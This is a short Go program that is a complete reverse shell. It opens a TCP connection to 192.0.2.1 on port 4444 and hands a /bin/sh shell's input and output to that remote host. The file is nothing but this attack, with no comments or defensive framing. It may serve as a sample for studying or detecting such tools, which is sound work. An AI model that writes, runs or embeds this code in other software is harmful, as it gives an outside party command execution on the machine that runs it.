package main

import (
	"net"
	"os/exec"
)

func main() {
	conn, _ := net.Dial("tcp", "192.0.2.1:4444")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	_ = cmd.Run()
}
